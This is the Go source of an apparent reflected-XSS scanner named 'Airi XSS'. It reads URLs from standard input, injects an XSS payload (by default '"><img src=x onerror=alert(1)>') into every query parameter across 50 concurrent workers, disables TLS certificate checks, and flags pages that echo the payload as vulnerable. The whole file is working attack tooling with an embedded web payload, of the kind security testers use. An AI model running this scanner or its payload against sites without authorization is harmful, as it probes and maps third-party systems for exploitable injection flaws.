package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

func init() {
	flag.Usage = func() {
		help := []string{
			"Airi XSS",
			"",
			"Usage:",
			"+====================================================================================+",
			"|       -p, -payload,         Reflection Flag, see readme for more information",
			"|       -H, --headers,        Headers",
			"|       -c                    Set Concurrency, Default: 50",
			"|       -x, --proxy,          Send traffic to a proxy",
			"|       -s, --only-poc        Show only potentially vulnerable urls",
			"|       -h                    Show This Help Message",
			"|",
			"+====================================================================================+",
			"",
		}

		fmt.Println(`
 _____ _     _
|  _  |_|___|_|_ _ ___ ___
|     | |  _| |_'_|_ -|_ -|
|__|__|_|_| |_|_,_|___|___|
`)
		fmt.Fprintf(os.Stderr, strings.Join(help, "\n"))
	}
}

type customheaders []string

func (m *customheaders) String() string {
	return "This message is for Setting Headers"
}

func (h *customheaders) Set(val string) error {
	*h = append(*h, val)
	return nil
}

var headers customheaders

func main() {
	var concurrency int
	flag.IntVar(&concurrency, "c", 50, "")

	var xsspayload string
	flag.StringVar(&xsspayload, "payload", "", "")
	flag.StringVar(&xsspayload, "p", "", "")

	var proxy string
	flag.StringVar(&proxy, "proxy", "0", "")
	flag.StringVar(&proxy, "x", "0", "")

	var poc bool
	flag.BoolVar(&poc, "only-poc", false, "")
	flag.BoolVar(&poc, "s", false, "")

	flag.Var(&headers, "headers", "")
	flag.Var(&headers, "H", "")

	flag.Parse()

	visto := make(map[string]bool)
	std := bufio.NewScanner(os.Stdin)
	targets := make(chan string)

	var wg sync.WaitGroup
	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for v := range targets {
				var output string
				if xsspayload != "" {
					output = xss(v, xsspayload, proxy, poc)
				} else {
					output = xssDefault(v, proxy, poc)
				}
				if output != "ERROR" {
					fmt.Println(output)
				}
			}
		}()
	}

	for std.Scan() {
		line := std.Text()
		if !visto[line] {
			targets <- line
			visto[line] = true
		}
	}
	close(targets)
	wg.Wait()
}

func buildClient(proxy string) *http.Client {
	trans := &http.Transport{
		MaxIdleConns:      30,
		IdleConnTimeout:   time.Second,
		DisableKeepAlives: true,
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: time.Second,
		}).DialContext,
	}

	if proxy != "0" {
		if p, err := url.Parse(proxy); err == nil {
			trans.Proxy = http.ProxyURL(p)
		}
	}

	return &http.Client{
		Transport: trans,
		Timeout:   3 * time.Second,
	}
}

func applyHeaders(req *http.Request) {
	req.Header.Set("Connection", "close")
	for _, v := range headers {
		s := strings.SplitN(v, ":", 2)
		if len(s) == 2 {
			req.Header.Set(strings.TrimSpace(s[0]), strings.TrimSpace(s[1]))
		}
	}
}

func isHTMLResponse(resp *http.Response) bool {
	contentType := resp.Header.Get("Content-Type")
	return strings.Contains(contentType, "text/html")
}

func xss(targetURL, payload, proxy string, onlyPOC bool) string {
	client := buildClient(proxy)

	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return "ERROR"
	}
	applyHeaders(req)

	resp, err := client.Do(req)
	if err != nil {
		return "ERROR"
	}
	defer resp.Body.Close()

	if !isHTMLResponse(resp) {
		return "ERROR"
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "ERROR"
	}

	quotedPayload := regexp.QuoteMeta(payload)
	match, _ := regexp.MatchString(quotedPayload, string(body))

	if onlyPOC {
		if match {
			return targetURL
		}
		return "ERROR"
	}

	if match {
		return "\033[1;31mVulnerable - " + targetURL + "\033[0;0m"
	}
	return "\033[1;30mNot Vulnerable - " + targetURL + "\033[0;0m"
}

func xssDefault(targetURL, proxy string, onlyPOC bool) string {
	client := buildClient(proxy)

	u, err := url.Parse(targetURL)
	if err != nil {
		return "ERROR"
	}

	defaultPayload := `"><img src=x onerror=alert(1)>`
	q, err := url.ParseQuery(u.RawQuery)
	if err != nil {
		return "ERROR"
	}
	for key := range q {
		q.Set(key, defaultPayload)
	}
	u.RawQuery = q.Encode()

	req, err := http.NewRequest("GET", u.String(), nil)
	if err != nil {
		return "ERROR"
	}
	applyHeaders(req)

	resp, err := client.Do(req)
	if err != nil {
		return "ERROR"
	}
	defer resp.Body.Close()

	if !isHTMLResponse(resp) {
		return "ERROR"
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "ERROR"
	}

	quotedPayload := regexp.QuoteMeta(defaultPayload)
	match, _ := regexp.MatchString(quotedPayload, string(body))

	if onlyPOC {
		if match {
			return u.String()
		}
		return "ERROR"
	}

	if match {
		return "\033[1;31mVulnerable - " + u.String() + "\033[0;0m"
	}
	return "\033[1;30mNot Vulnerable - " + u.String() + "\033[0;0m"
}
